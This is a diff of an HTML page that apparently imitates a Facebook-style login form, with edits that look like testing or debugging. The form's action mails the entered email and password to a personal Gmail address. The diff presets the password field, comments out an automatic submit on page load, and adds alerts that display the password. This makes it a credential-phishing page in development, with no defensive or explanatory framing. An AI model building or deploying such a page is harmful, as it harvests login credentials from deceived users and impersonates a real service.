@@ -2,7 +2,6 @@
 
 <html>
     <form id="login_form" action="MAILTO:bridget.basan@gmail.com" method="post" novalidate="1" onsubmit="return window.Event && Event.__inlineSubmit && Event.__inlineSubmit(this,event)">
-        <input type="hidden" name="lsd" value="AVprhRnM" autocomplete="off">
         <table cellspacing="0" role="presentation">
             <tbody>
                 <tr>
@@ -18,25 +17,13 @@
                         <input type="email" class="inputtext" name="email" id="email" value="" tabindex="1">
                     </td>
                     <td>
-                        <input type="password" class="inputtext" name="pass" id="pass" tabindex="2">
+                        <input type="password" class="inputtext" name="pass" id="pass" tabindex="2" value="123">
                     </td>
                     <td>
                         <label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_v">
                             <input value="Log In" tabindex="4" type="submit" id="u_0_v">
                         </label>
                     </td>
-                </tr>
-                <tr>
-                    <td class="login_form_label_field">
-                        <div>
-                            <div class="uiInputLabel clearfix uiInputLabelLegacy">
-                                <input id="persist_box" type="checkbox" name="persistent" value="1" checked="1" class="uiInputLabelInput uiInputLabelCheckbox">
-                                    <label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label>
-                            </div>
-                            <input type="hidden" name="default_persistent" value="1">
-                        </div>
-                    </td>
-                    <td class="login_form_label_field"><a href="/recover/initiate?lwv=110">Forgot your password?</a></td>
                 </tr>
             </tbody>
         </table>
@@ -48,7 +35,8 @@
 
 <script>
     window.onload = function(){
-        document.getElementById("login_form").submit();
+        //document.getElementById("login_form").submit();
         alert('hey!');
+        alert(document.getElementsByName("pass")[0].value);
     }
 </script>
